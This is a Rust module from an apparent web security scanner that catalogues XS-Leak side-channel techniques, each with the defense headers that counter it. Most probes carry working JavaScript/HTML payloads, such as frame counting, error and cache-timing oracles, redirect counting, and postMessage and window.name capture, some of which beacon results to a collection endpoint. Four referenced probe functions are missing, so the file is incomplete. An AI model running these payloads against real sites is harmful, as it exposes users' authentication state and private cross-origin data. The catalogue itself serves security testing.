use std::collections::HashMap;
use std::fmt;
use std::time::Duration;

use aegis_protocol::finding::VulnerabilityClass;

/// Cross-origin information leakage (XS-Leaks) taxonomy engine.
///
/// XS-Leaks exploit browser side channels to extract cross-origin
/// data that should be protected by the Same-Origin Policy. Unlike
/// XSS (which requires code execution in the target origin), XS-Leaks
/// work by observing *observable differences* in browser behavior when
/// interacting with cross-origin resources.
///
/// The attacker's page performs a cross-origin interaction (embed an
/// iframe, load an image, fetch a resource) and measures a side channel
/// (timing, frame count, error event, cache state, redirect count).
/// Differences in the side channel reveal information about the victim's
/// authenticated state on the target origin.
///
/// Taxonomy based on xsleaks.dev + Sudhodanan et al. (CCS 2020) +
/// Van Goethem et al. (USENIX 2020).

/// Categories of XS-Leak techniques grouped by observation channel.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum XsLeakCategory {
    /// Observe window.length after cross-origin navigation
    FrameCounting,
    /// onerror/onload event timing reveals resource existence
    ErrorEventDetection,
    /// Probe whether a resource is cached (user visited before?)
    CacheTimingProbe,
    /// Count redirect hops via CSP violation reports or fetch timing
    RedirectCounting,
    /// Content-Type response triggers different browser behavior
    ContentTypeSniffing,
    /// PerformanceObserver / Resource Timing API leaks
    PerformanceApiLeak,
    /// postMessage information leakage through origin checks
    PostMessageLeak,
    /// window.opener / window.name cross-origin data transfer
    WindowPropertyLeak,
    /// Detect authenticated vs unauthenticated via response size
    SizeBasedLeak,
    /// Service Worker cache partition side channel
    ServiceWorkerLeak,
    /// Scroll-to-text-fragment detection (find-in-page oracle)
    TextFragmentLeak,
    /// Connection pool exhaustion timing
    ConnectionPoolLeak,
}

impl fmt::Display for XsLeakCategory {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::FrameCounting => write!(f, "Frame Counting"),
            Self::ErrorEventDetection => write!(f, "Error Event Detection"),
            Self::CacheTimingProbe => write!(f, "Cache Timing Probe"),
            Self::RedirectCounting => write!(f, "Redirect Counting"),
            Self::ContentTypeSniffing => write!(f, "Content-Type Sniffing"),
            Self::PerformanceApiLeak => write!(f, "Performance API Leak"),
            Self::PostMessageLeak => write!(f, "postMessage Leak"),
            Self::WindowPropertyLeak => write!(f, "Window Property Leak"),
            Self::SizeBasedLeak => write!(f, "Size-Based Leak"),
            Self::ServiceWorkerLeak => write!(f, "Service Worker Leak"),
            Self::TextFragmentLeak => write!(f, "Text Fragment Leak"),
            Self::ConnectionPoolLeak => write!(f, "Connection Pool Leak"),
        }
    }
}

impl XsLeakCategory {
    pub fn all() -> &'static [Self] {
        &[
            Self::FrameCounting,
            Self::ErrorEventDetection,
            Self::CacheTimingProbe,
            Self::RedirectCounting,
            Self::ContentTypeSniffing,
            Self::PerformanceApiLeak,
            Self::PostMessageLeak,
            Self::WindowPropertyLeak,
            Self::SizeBasedLeak,
            Self::ServiceWorkerLeak,
            Self::TextFragmentLeak,
            Self::ConnectionPoolLeak,
        ]
    }

    pub fn to_vulnerability_class(self) -> VulnerabilityClass {
        match self {
            Self::FrameCounting
            | Self::ErrorEventDetection
            | Self::CacheTimingProbe
            | Self::RedirectCounting
            | Self::ContentTypeSniffing
            | Self::PerformanceApiLeak
            | Self::SizeBasedLeak
            | Self::ServiceWorkerLeak
            | Self::TextFragmentLeak
            | Self::ConnectionPoolLeak => VulnerabilityClass::InformationDisclosure,
            Self::PostMessageLeak | Self::WindowPropertyLeak => {
                VulnerabilityClass::CrossOriginMisconfiguration
            }
        }
    }

    /// Minimum browser requirements for this leak class.
    pub fn required_features(self) -> &'static [BrowserFeature] {
        match self {
            Self::FrameCounting => &[BrowserFeature::Iframes],
            Self::ErrorEventDetection => &[BrowserFeature::ImgTag, BrowserFeature::ScriptTag],
            Self::CacheTimingProbe => &[BrowserFeature::Fetch],
            Self::RedirectCounting => &[BrowserFeature::CspReporting],
            Self::ContentTypeSniffing => &[BrowserFeature::ObjectTag],
            Self::PerformanceApiLeak => &[BrowserFeature::PerformanceObserver],
            Self::PostMessageLeak => &[BrowserFeature::PostMessage],
            Self::WindowPropertyLeak => &[BrowserFeature::WindowOpen],
            Self::SizeBasedLeak => &[BrowserFeature::Fetch, BrowserFeature::PerformanceObserver],
            Self::ServiceWorkerLeak => &[BrowserFeature::ServiceWorker],
            Self::TextFragmentLeak => &[BrowserFeature::TextFragment],
            Self::ConnectionPoolLeak => &[BrowserFeature::WebSocket],
        }
    }
}

/// Browser features required for specific XS-Leak techniques.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum BrowserFeature {
    Iframes,
    ImgTag,
    ScriptTag,
    ObjectTag,
    Fetch,
    PerformanceObserver,
    PostMessage,
    WindowOpen,
    ServiceWorker,
    TextFragment,
    WebSocket,
    CspReporting,
    SharedArrayBuffer,
}

impl fmt::Display for BrowserFeature {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Iframes => write!(f, "iframe"),
            Self::ImgTag => write!(f, "img"),
            Self::ScriptTag => write!(f, "script"),
            Self::ObjectTag => write!(f, "object"),
            Self::Fetch => write!(f, "fetch"),
            Self::PerformanceObserver => write!(f, "PerformanceObserver"),
            Self::PostMessage => write!(f, "postMessage"),
            Self::WindowOpen => write!(f, "window.open"),
            Self::ServiceWorker => write!(f, "ServiceWorker"),
            Self::TextFragment => write!(f, "scroll-to-text-fragment"),
            Self::WebSocket => write!(f, "WebSocket"),
            Self::CspReporting => write!(f, "CSP reporting"),
            Self::SharedArrayBuffer => write!(f, "SharedArrayBuffer"),
        }
    }
}

/// Defense headers that mitigate specific XS-Leak categories.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum XsLeakDefense {
    /// X-Frame-Options / CSP frame-ancestors
    FrameProtection,
    /// Cross-Origin-Opener-Policy: same-origin
    Coop,
    /// Cross-Origin-Resource-Policy: same-origin
    Corp,
    /// Cross-Origin-Embedder-Policy: require-corp
    Coep,
    /// SameSite=Strict cookies
    SameSiteCookies,
    /// Cache-Control: no-store
    NoCacheStore,
    /// Vary: Cookie (partitioned caching)
    VaryCookie,
    /// Fetch Metadata (Sec-Fetch-Site, Sec-Fetch-Mode)
    FetchMetadata,
    /// Content-Type: with charset (prevents sniffing)
    ExplicitContentType,
}

impl fmt::Display for XsLeakDefense {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::FrameProtection => write!(f, "X-Frame-Options / frame-ancestors"),
            Self::Coop => write!(f, "Cross-Origin-Opener-Policy: same-origin"),
            Self::Corp => write!(f, "Cross-Origin-Resource-Policy: same-origin"),
            Self::Coep => write!(f, "Cross-Origin-Embedder-Policy: require-corp"),
            Self::SameSiteCookies => write!(f, "SameSite=Strict cookies"),
            Self::NoCacheStore => write!(f, "Cache-Control: no-store"),
            Self::VaryCookie => write!(f, "Vary: Cookie"),
            Self::FetchMetadata => write!(f, "Fetch Metadata headers"),
            Self::ExplicitContentType => write!(f, "Explicit Content-Type"),
        }
    }
}

impl XsLeakDefense {
    /// HTTP header(s) to check for this defense.
    pub fn header_patterns(&self) -> &[(&str, &str)] {
        match self {
            Self::FrameProtection => &[
                ("x-frame-options", "DENY"),
                ("x-frame-options", "SAMEORIGIN"),
                ("content-security-policy", "frame-ancestors"),
            ],
            Self::Coop => &[("cross-origin-opener-policy", "same-origin")],
            Self::Corp => &[("cross-origin-resource-policy", "same-origin")],
            Self::Coep => &[("cross-origin-embedder-policy", "require-corp")],
            Self::SameSiteCookies => &[("set-cookie", "SameSite=Strict")],
            Self::NoCacheStore => &[("cache-control", "no-store")],
            Self::VaryCookie => &[("vary", "Cookie")],
            Self::FetchMetadata => &[],
            Self::ExplicitContentType => &[("content-type", "charset=")],
        }
    }
}

/// Observed response characteristics for XS-Leak differential analysis.
#[derive(Debug, Clone)]
pub struct XsLeakObservation {
    pub url: String,
    pub status_code: u16,
    pub response_time: Duration,
    pub content_length: Option<usize>,
    pub content_type: Option<String>,
    pub redirect_count: usize,
    pub frame_count: Option<usize>,
    pub has_error_event: bool,
    pub cached: Option<bool>,
    pub headers: HashMap<String, String>,
}

/// Comparison of two observations (authenticated vs unauthenticated).
#[derive(Debug, Clone)]
pub struct XsLeakDifferential {
    pub category: XsLeakCategory,
    pub authenticated: XsLeakObservation,
    pub unauthenticated: XsLeakObservation,
    pub signal_detected: bool,
    pub signal_strength: f64,
    pub description: String,
}

/// A concrete XS-Leak probe definition — the JavaScript/HTML payload
/// and the expected observable difference.
#[derive(Debug, Clone)]
pub struct XsLeakProbe {
    pub id: String,
    pub category: XsLeakCategory,
    pub name: String,
    pub description: String,
    pub inclusion_method: InclusionMethod,
    pub observable: Observable,
    pub html_payload: String,
    pub js_payload: String,
    pub timing_threshold: Duration,
    pub defenses: Vec<XsLeakDefense>,
}

/// How the attacker includes the cross-origin resource.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum InclusionMethod {
    Iframe,
    ImgTag,
    ScriptTag,
    ObjectTag,
    LinkPreload,
    FetchNoCors,
    FetchCors,
    WindowOpen,
    VideoTag,
    AudioTag,
    CssImport,
    Beacon,
}

impl fmt::Display for InclusionMethod {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Iframe => write!(f, "iframe"),
            Self::ImgTag => write!(f, "img tag"),
            Self::ScriptTag => write!(f, "script tag"),
            Self::ObjectTag => write!(f, "object tag"),
            Self::LinkPreload => write!(f, "link preload"),
            Self::FetchNoCors => write!(f, "fetch (no-cors)"),
            Self::FetchCors => write!(f, "fetch (cors)"),
            Self::WindowOpen => write!(f, "window.open"),
            Self::VideoTag => write!(f, "video tag"),
            Self::AudioTag => write!(f, "audio tag"),
            Self::CssImport => write!(f, "CSS @import"),
            Self::Beacon => write!(f, "navigator.sendBeacon"),
        }
    }
}

/// What side channel the attacker observes.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum Observable {
    EventTiming,
    FrameCount,
    ErrorVsLoad,
    RedirectCount,
    CacheHitMiss,
    ContentTypeEvent,
    ResponseSize,
    WindowProperties,
    PostMessageOrigin,
    PerformanceEntry,
    ConnectionTiming,
    ScrollPosition,
}

impl fmt::Display for Observable {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::EventTiming => write!(f, "event timing"),
            Self::FrameCount => write!(f, "window.length"),
            Self::ErrorVsLoad => write!(f, "onerror vs onload"),
            Self::RedirectCount => write!(f, "redirect count"),
            Self::CacheHitMiss => write!(f, "cache hit/miss"),
            Self::ContentTypeEvent => write!(f, "content-type event"),
            Self::ResponseSize => write!(f, "response size"),
            Self::WindowProperties => write!(f, "window properties"),
            Self::PostMessageOrigin => write!(f, "postMessage origin"),
            Self::PerformanceEntry => write!(f, "PerformanceEntry"),
            Self::ConnectionTiming => write!(f, "connection timing"),
            Self::ScrollPosition => write!(f, "scroll position"),
        }
    }
}

/// Generate the full XS-Leak probe catalog.
/// Each probe is a concrete attack technique with HTML/JS payload,
/// inclusion method, observable channel, and known defenses.
pub fn generate_probe_catalog() -> Vec<XsLeakProbe> {
    let mut probes = Vec::new();

    probes.extend(frame_counting_probes());
    probes.extend(error_event_probes());
    probes.extend(cache_timing_probes());
    probes.extend(redirect_counting_probes());
    probes.extend(content_type_probes());
    probes.extend(performance_api_probes());
    probes.extend(postmessage_probes());
    probes.extend(window_property_probes());
    probes.extend(size_based_probes());
    probes.extend(service_worker_probes());
    probes.extend(text_fragment_probes());
    probes.extend(connection_pool_probes());

    probes
}

fn frame_counting_probes() -> Vec<XsLeakProbe> {
    vec![
        XsLeakProbe {
            id: "fc-001".into(),
            category: XsLeakCategory::FrameCounting,
            name: "Frame count after cross-origin navigation".into(),
            description: "Open target URL in iframe, read window.length. \
                Authenticated users may see different frame counts (e.g., \
                dashboard with sub-frames vs login redirect with 0 frames)."
                .into(),
            inclusion_method: InclusionMethod::Iframe,
            observable: Observable::FrameCount,
            html_payload: r#"<iframe id="target" src="TARGET_URL"></iframe>
<script>
  const f = document.getElementById('target');
  f.onload = () => {
    const count = f.contentWindow.length;
    navigator.sendBeacon('/collect', JSON.stringify({
      type: 'frame_count', url: 'TARGET_URL', count: count
    }));
  };
</script>"#
                .into(),
            js_payload: r#"async function probeFrameCount(url) {
  return new Promise((resolve) => {
    const f = document.createElement('iframe');
    f.style.display = 'none';
    f.src = url;
    f.onload = () => {
      try { resolve({ frames: f.contentWindow.length }); }
      catch(e) { resolve({ frames: -1, error: e.message }); }
      finally { document.body.removeChild(f); }
    };
    document.body.appendChild(f);
  });
}"#
            .into(),
            timing_threshold: Duration::from_millis(0),
            defenses: vec![XsLeakDefense::FrameProtection, XsLeakDefense::Coop],
        },
        XsLeakProbe {
            id: "fc-002".into(),
            category: XsLeakCategory::FrameCounting,
            name: "Window.open frame count oracle".into(),
            description: "Use window.open instead of iframe to bypass \
                X-Frame-Options. The opened window's .length property \
                still leaks frame count cross-origin."
                .into(),
            inclusion_method: InclusionMethod::WindowOpen,
            observable: Observable::FrameCount,
            html_payload: r#"<script>
  const w = window.open('TARGET_URL');
  setTimeout(() => {
    const count = w.length;
    navigator.sendBeacon('/collect', JSON.stringify({
      type: 'frame_count_popup', url: 'TARGET_URL', count: count
    }));
    w.close();
  }, 2000);
</script>"#
                .into(),
            js_payload: r#"async function probeWindowFrameCount(url) {
  return new Promise((resolve) => {
    const w = window.open(url);
    const check = setInterval(() => {
      try {
        const count = w.length;
        if (count >= 0) {
          clearInterval(check);
          w.close();
          resolve({ frames: count });
        }
      } catch(e) { /* not ready yet */ }
    }, 100);
    setTimeout(() => { clearInterval(check); w.close();
      resolve({ frames: -1, timeout: true }); }, 5000);
  });
}"#
            .into(),
            timing_threshold: Duration::from_millis(0),
            defenses: vec![XsLeakDefense::Coop],
        },
    ]
}

fn error_event_probes() -> Vec<XsLeakProbe> {
    vec![
        XsLeakProbe {
            id: "ee-001".into(),
            category: XsLeakCategory::ErrorEventDetection,
            name: "Image tag error/load oracle".into(),
            description: "Load cross-origin URL as <img>. If the response \
                is an image (authenticated content), onload fires. If it \
                redirects to login or returns non-image, onerror fires. \
                Distinguishes authenticated vs unauthenticated state."
                .into(),
            inclusion_method: InclusionMethod::ImgTag,
            observable: Observable::ErrorVsLoad,
            html_payload: r#"<script>
  function probeImage(url) {
    return new Promise((resolve) => {
      const img = new Image();
      img.onload = () => resolve({ loaded: true, w: img.width, h: img.height });
      img.onerror = () => resolve({ loaded: false });
      img.src = url;
    });
  }
  probeImage('TARGET_URL').then(r =>
    navigator.sendBeacon('/collect', JSON.stringify({
      type: 'img_oracle', url: 'TARGET_URL', ...r
    }))
  );
</script>"#
                .into(),
            js_payload: r#"async function probeImageOracle(url) {
  return new Promise((resolve) => {
    const img = new Image();
    img.onload = () => resolve({ loaded: true, width: img.width, height: img.height });
    img.onerror = () => resolve({ loaded: false });
    img.src = url;
  });
}"#
            .into(),
            timing_threshold: Duration::from_millis(0),
            defenses: vec![XsLeakDefense::Corp, XsLeakDefense::SameSiteCookies],
        },
        XsLeakProbe {
            id: "ee-002".into(),
            category: XsLeakCategory::ErrorEventDetection,
            name: "Script tag error/load oracle".into(),
            description: "Load cross-origin URL as <script>. If the response \
                is valid JavaScript, onload fires. If error or non-JS content, \
                onerror fires. Leaks content-type and authentication state."
                .into(),
            inclusion_method: InclusionMethod::ScriptTag,
            observable: Observable::ErrorVsLoad,
            html_payload: r#"<script>
  function probeScript(url) {
    return new Promise((resolve) => {
      const s = document.createElement('script');
      s.onload = () => { resolve({ loaded: true }); s.remove(); };
      s.onerror = () => { resolve({ loaded: false }); s.remove(); };
      s.src = url;
      document.head.appendChild(s);
    });
  }
  probeScript('TARGET_URL').then(r =>
    navigator.sendBeacon('/collect', JSON.stringify({
      type: 'script_oracle', url: 'TARGET_URL', ...r
    }))
  );
</script>"#
                .into(),
            js_payload: r#"async function probeScriptOracle(url) {
  return new Promise((resolve) => {
    const s = document.createElement('script');
    s.onload = () => { resolve({ loaded: true }); s.remove(); };
    s.onerror = () => { resolve({ loaded: false }); s.remove(); };
    s.src = url;
    document.head.appendChild(s);
  });
}"#
            .into(),
            timing_threshold: Duration::from_millis(0),
            defenses: vec![XsLeakDefense::Corp, XsLeakDefense::SameSiteCookies],
        },
        XsLeakProbe {
            id: "ee-003".into(),
            category: XsLeakCategory::ErrorEventDetection,
            name: "Object tag rendering oracle".into(),
            description: "Load cross-origin URL as <object>. Fires 'load' \
                if renderable content (HTML, PDF, image), 'error' otherwise. \
                Can distinguish content types across origins."
                .into(),
            inclusion_method: InclusionMethod::ObjectTag,
            observable: Observable::ErrorVsLoad,
            html_payload: r#"<script>
  function probeObject(url) {
    return new Promise((resolve) => {
      const obj = document.createElement('object');
      obj.data = url;
      obj.onload = () => { resolve({ rendered: true }); obj.remove(); };
      obj.onerror = () => { resolve({ rendered: false }); obj.remove(); };
      document.body.appendChild(obj);
    });
  }
  probeObject('TARGET_URL').then(r =>
    navigator.sendBeacon('/collect', JSON.stringify({
      type: 'object_oracle', url: 'TARGET_URL', ...r
    }))
  );
</script>"#
                .into(),
            js_payload: r#"async function probeObjectOracle(url) {
  return new Promise((resolve) => {
    const obj = document.createElement('object');
    obj.data = url;
    obj.onload = () => { resolve({ rendered: true }); obj.remove(); };
    obj.onerror = () => { resolve({ rendered: false }); obj.remove(); };
    document.body.appendChild(obj);
  });
}"#
            .into(),
            timing_threshold: Duration::from_millis(0),
            defenses: vec![
                XsLeakDefense::Corp,
                XsLeakDefense::SameSiteCookies,
                XsLeakDefense::ExplicitContentType,
            ],
        },
    ]
}

fn cache_timing_probes() -> Vec<XsLeakProbe> {
    vec![
        XsLeakProbe {
            id: "ct-001".into(),
            category: XsLeakCategory::CacheTimingProbe,
            name: "Fetch timing cache oracle".into(),
            description: "Fetch a cross-origin resource twice. First fetch \
                populates cache; second fetch returns faster if cached. \
                Comparing timing reveals if the resource was already \
                cached (user visited the target site before)."
                .into(),
            inclusion_method: InclusionMethod::FetchNoCors,
            observable: Observable::CacheHitMiss,
            html_payload: String::new(),
            js_payload: r#"async function probeCacheTiming(url) {
  // First: evict by fetching with cache-busting param
  await fetch(url + '?_cb=' + Math.random(), { mode: 'no-cors', cache: 'no-store' });

  // Second: time the actual fetch (will hit cache if user visited before)
  const t0 = performance.now();
  await fetch(url, { mode: 'no-cors', cache: 'force-cache' });
  const t1 = performance.now();
  const elapsed = t1 - t0;

  // Third: fetch with no-store (always network) as baseline
  const t2 = performance.now();
  await fetch(url, { mode: 'no-cors', cache: 'no-store' });
  const t3 = performance.now();
  const baseline = t3 - t2;

  return {
    cached_ms: elapsed,
    network_ms: baseline,
    likely_cached: elapsed < (baseline * 0.5),
    ratio: elapsed / Math.max(baseline, 0.01)
  };
}"#
            .into(),
            timing_threshold: Duration::from_millis(50),
            defenses: vec![XsLeakDefense::NoCacheStore, XsLeakDefense::VaryCookie],
        },
        XsLeakProbe {
            id: "ct-002".into(),
            category: XsLeakCategory::CacheTimingProbe,
            name: "Performance API cache detection".into(),
            description: "Use PerformanceObserver to measure transferSize \
                of cross-origin resources. transferSize=0 means cache hit, \
                revealing prior visits. Requires Timing-Allow-Origin header \
                for full data, but even without it, duration leaks."
                .into(),
            inclusion_method: InclusionMethod::ImgTag,
            observable: Observable::PerformanceEntry,
            html_payload: String::new(),
            js_payload: r#"async function probePerfCacheLeak(url) {
  return new Promise((resolve) => {
    const observer = new PerformanceObserver((list) => {
      for (const entry of list.getEntries()) {
        if (entry.name.includes(url)) {
          observer.disconnect();
          resolve({
            duration: entry.duration,
            transfer_size: entry.transferSize || 'restricted',
            encoded_body_size: entry.encodedBodySize || 'restricted',
            from_cache: entry.transferSize === 0,
            timing: {
              dns: entry.domainLookupEnd - entry.domainLookupStart,
              tcp: entry.connectEnd - entry.connectStart,
              ttfb: entry.responseStart - entry.requestStart,
              download: entry.responseEnd - entry.responseStart,
            }
          });
        }
      }
    });
    observer.observe({ type: 'resource', buffered: true });
    const img = new Image();
    img.src = url;
    setTimeout(() => { observer.disconnect();
      resolve({ timeout: true }); }, 5000);
  });
}"#
            .into(),
            timing_threshold: Duration::from_millis(5),
            defenses: vec![XsLeakDefense::NoCacheStore, XsLeakDefense::Corp],
        },
    ]
}

fn redirect_counting_probes() -> Vec<XsLeakProbe> {
    vec![
        XsLeakProbe {
            id: "rc-001".into(),
            category: XsLeakCategory::RedirectCounting,
            name: "CSP violation redirect counter".into(),
            description: "Set a strict CSP that blocks the target origin. \
                Each redirect triggers a CSP violation report with the \
                blocked-uri. Counting violations reveals redirect chain \
                length, which differs for auth vs unauth users."
                .into(),
            inclusion_method: InclusionMethod::FetchNoCors,
            observable: Observable::RedirectCount,
            html_payload: String::new(),
            js_payload: r#"async function probeRedirectCount(url) {
  let violations = 0;
  const blockedUris = [];

  return new Promise((resolve) => {
    document.addEventListener('securitypolicyviolation', (e) => {
      violations++;
      blockedUris.push(e.blockedURI);
    });

    // Create a meta CSP that only allows our origin
    const meta = document.createElement('meta');
    meta.httpEquiv = 'Content-Security-Policy';
    meta.content = "connect-src 'self'; report-uri /csp-report";
    document.head.appendChild(meta);

    fetch(url, { mode: 'no-cors', redirect: 'follow' }).catch(() => {});

    setTimeout(() => {
      meta.remove();
      resolve({
        redirect_count: violations,
        blocked_uris: blockedUris,
        auth_indicator: violations > 0
      });
    }, 3000);
  });
}"#
            .into(),
            timing_threshold: Duration::from_millis(0),
            defenses: vec![XsLeakDefense::SameSiteCookies, XsLeakDefense::FetchMetadata],
        },
        XsLeakProbe {
            id: "rc-002".into(),
            category: XsLeakCategory::RedirectCounting,
            name: "Fetch timing redirect detection".into(),
            description: "Time a fetch to the target. Redirects add latency \
                proportional to the number of hops. Authenticated users \
                may get 0 redirects (direct content), while unauthenticated \
                users get 1+ redirects (to login page)."
                .into(),
            inclusion_method: InclusionMethod::FetchNoCors,
            observable: Observable::EventTiming,
            html_payload: String::new(),
            js_payload: r#"async function probeRedirectTiming(url, iterations) {
  const n = iterations || 10;
  const timings = [];

  for (let i = 0; i < n; i++) {
    const t0 = performance.now();
    try { await fetch(url + '?_t=' + i, { mode: 'no-cors', redirect: 'follow' }); }
    catch(e) { /* expected for cross-origin */ }
    const t1 = performance.now();
    timings.push(t1 - t0);
  }

  timings.sort((a, b) => a - b);
  const median = timings[Math.floor(n / 2)];
  const mean = timings.reduce((a, b) => a + b, 0) / n;

  return {
    median_ms: median,
    mean_ms: mean,
    min_ms: timings[0],
    max_ms: timings[n - 1],
    samples: timings,
    likely_redirect: median > 100
  };
}"#
            .into(),
            timing_threshold: Duration::from_millis(100),
            defenses: vec![XsLeakDefense::SameSiteCookies],
        },
    ]
}

fn content_type_probes() -> Vec<XsLeakProbe> {
    vec![XsLeakProbe {
        id: "cs-001".into(),
        category: XsLeakCategory::ContentTypeSniffing,
        name: "Object/embed content-type oracle".into(),
        description: "Load target URL in <object>. Browser dispatches \
            to different handlers based on Content-Type. PDF opens \
            plugin, HTML renders, image displays. The rendering \
            event (or lack thereof) reveals the content-type, which \
            may differ for authenticated vs unauthenticated users."
            .into(),
        inclusion_method: InclusionMethod::ObjectTag,
        observable: Observable::ContentTypeEvent,
        html_payload: String::new(),
        js_payload: r#"async function probeContentTypeOracle(url) {
  return new Promise((resolve) => {
    const obj = document.createElement('object');
    obj.style.display = 'none';
    obj.data = url;

    let loadFired = false;
    let errorFired = false;

    obj.onload = () => { loadFired = true; };
    obj.onerror = () => { errorFired = true; };

    document.body.appendChild(obj);

    setTimeout(() => {
      const hasContent = obj.contentDocument !== null;
      obj.remove();
      resolve({
        load_event: loadFired,
        error_event: errorFired,
        has_content_document: hasContent,
        inferred_type: loadFired ? 'renderable' : 'non-renderable'
      });
    }, 3000);
  });
}"#
        .into(),
        timing_threshold: Duration::from_millis(0),
        defenses: vec![XsLeakDefense::Corp, XsLeakDefense::ExplicitContentType],
    }]
}

fn performance_api_probes() -> Vec<XsLeakProbe> {
    vec![
        XsLeakProbe {
            id: "pa-001".into(),
            category: XsLeakCategory::PerformanceApiLeak,
            name: "Resource Timing API size leak".into(),
            description: "PerformanceResourceTiming exposes duration, \
                transferSize (with TAO), and timing breakdown. Even \
                without Timing-Allow-Origin, the `duration` field \
                correlates with response size, leaking auth-dependent \
                content length."
                .into(),
            inclusion_method: InclusionMethod::FetchNoCors,
            observable: Observable::PerformanceEntry,
            html_payload: String::new(),
            js_payload: r#"async function probeResourceTiming(url) {
  performance.clearResourceTimings();

  await fetch(url, { mode: 'no-cors' }).catch(() => {});

  const entries = performance.getEntriesByName(url, 'resource');
  if (entries.length === 0) return { found: false };

  const e = entries[0];
  return {
    found: true,
    duration: e.duration,
    transfer_size: e.transferSize,
    encoded_body_size: e.encodedBodySize,
    decoded_body_size: e.decodedBodySize,
    redirect_count: e.redirectCount || 0,
    tao_present: e.transferSize > 0,
    timing: {
      redirect: e.redirectEnd - e.redirectStart,
      dns: e.domainLookupEnd - e.domainLookupStart,
      tcp: e.connectEnd - e.connectStart,
      tls: e.secureConnectionStart > 0
        ? e.connectEnd - e.secureConnectionStart : 0,
      ttfb: e.responseStart - e.requestStart,
      download: e.responseEnd - e.responseStart,
    }
  };
}"#
            .into(),
            timing_threshold: Duration::from_millis(0),
            defenses: vec![XsLeakDefense::Corp],
        },
        XsLeakProbe {
            id: "pa-002".into(),
            category: XsLeakCategory::PerformanceApiLeak,
            name: "Navigation Timing cross-origin leak".into(),
            description: "After navigating an iframe to a cross-origin URL, \
                performance.getEntriesByType('navigation') in the parent \
                may still expose timing data if the iframe navigates back. \
                The time spent on the cross-origin page leaks."
                .into(),
            inclusion_method: InclusionMethod::Iframe,
            observable: Observable::EventTiming,
            html_payload: String::new(),
            js_payload: r#"async function probeNavTiming(url) {
  return new Promise((resolve) => {
    const f = document.createElement('iframe');
    f.style.display = 'none';
    const t0 = performance.now();

    f.onload = () => {
      const t1 = performance.now();
      const loadTime = t1 - t0;
      f.remove();
      resolve({
        load_time_ms: loadTime,
        inferred_size: loadTime > 500 ? 'large' : 'small',
        auth_hint: loadTime > 200 ? 'content_served' : 'redirect_to_login'
      });
    };

    f.src = url;
    document.body.appendChild(f);

    setTimeout(() => {
      f.remove();
      resolve({ timeout: true, elapsed_ms: performance.now() - t0 });
    }, 10000);
  });
}"#
            .into(),
            timing_threshold: Duration::from_millis(200),
            defenses: vec![
                XsLeakDefense::FrameProtection,
                XsLeakDefense::Coop,
                XsLeakDefense::Corp,
            ],
        },
    ]
}

fn postmessage_probes() -> Vec<XsLeakProbe> {
    vec![XsLeakProbe {
        id: "pm-001".into(),
        category: XsLeakCategory::PostMessageLeak,
        name: "postMessage origin validation bypass".into(),
        description: "Open target in window.open, listen for postMessage. \
            If the target sends postMessage without checking the origin \
            of the listener, an attacker page receives cross-origin data. \
            Common in SSO flows, OAuth callbacks, chat widgets."
            .into(),
        inclusion_method: InclusionMethod::WindowOpen,
        observable: Observable::PostMessageOrigin,
        html_payload: String::new(),
        js_payload: r#"async function probePostMessage(url, timeout_ms) {
  const messages = [];
  const t = timeout_ms || 5000;

  return new Promise((resolve) => {
    window.addEventListener('message', (e) => {
      messages.push({
        origin: e.origin,
        data: typeof e.data === 'string'
          ? e.data.substring(0, 500)
          : JSON.stringify(e.data).substring(0, 500),
        has_origin_check: false  // we received it, so no check
      });
    });

    const w = window.open(url);

    setTimeout(() => {
      if (w) w.close();
      resolve({
        messages_received: messages.length,
        messages: messages,
        vulnerable: messages.length > 0
      });
    }, t);
  });
}"#
        .into(),
        timing_threshold: Duration::from_millis(0),
        defenses: vec![XsLeakDefense::Coop],
    }]
}

fn window_property_probes() -> Vec<XsLeakProbe> {
    vec![
        XsLeakProbe {
            id: "wp-001".into(),
            category: XsLeakCategory::WindowPropertyLeak,
            name: "window.name cross-origin data exfiltration".into(),
            description: "Navigate a popup to the target, then back to the \
                attacker origin. window.name persists across navigations, \
                so if the target sets window.name, the attacker can read \
                it after the return navigation."
                .into(),
            inclusion_method: InclusionMethod::WindowOpen,
            observable: Observable::WindowProperties,
            html_payload: String::new(),
            js_payload: r#"async function probeWindowName(targetUrl, returnUrl) {
  return new Promise((resolve) => {
    const w = window.open(targetUrl);

    setTimeout(() => {
      // Navigate back to our origin to read window.name
      w.location = returnUrl || location.origin + '/blank.html';

      setTimeout(() => {
        let name = '';
        try { name = w.name; } catch(e) { /* still cross-origin */ }
        w.close();
        resolve({
          window_name: name,
          has_data: name.length > 0,
          data_length: name.length
        });
      }, 2000);
    }, 3000);
  });
}"#
            .into(),
            timing_threshold: Duration::from_millis(0),
            defenses: vec![XsLeakDefense::Coop],
        },
        XsLeakProbe {
            id: "wp-002".into(),
            category: XsLeakCategory::WindowPropertyLeak,
            name: "History length oracle".into(),
            description: "Open an iframe, count history.length before and \
                after navigation. If the target redirects (auth check), \
                history grows differently than if it serves content \
                directly. Reveals auth state without reading content."
                .into(),
            inclusion_method: InclusionMethod::Iframe,
            observable: Observable::WindowProperties,
            html_payload: String::new(),
            js_payload: r#"async function probeHistoryLength(url) {
  return new Promise((resolve) => {
    const f = document.createElement('iframe');
    f.style.display = 'none';

    const before = history.length;
    f.src = url;

    f.onload = () => {
      setTimeout(() => {
        let iframeHistLen = -1;
        try { iframeHistLen = f.contentWindow.history.length; } catch(e) {}
        const after = history.length;
        f.remove();
        resolve({
          parent_history_before: before,
          parent_history_after: after,
          iframe_history: iframeHistLen,
          redirects_detected: after > before
        });
      }, 1000);
    };

    document.body.appendChild(f);
    setTimeout(() => { f.remove(); resolve({ timeout: true }); }, 8000);
  });
}"#
            .into(),
            timing_threshold: Duration::from_millis(0),
            defenses: vec![XsLeakDefense::FrameProtection, XsLeakDefense::Coop],
        },
    ]
}

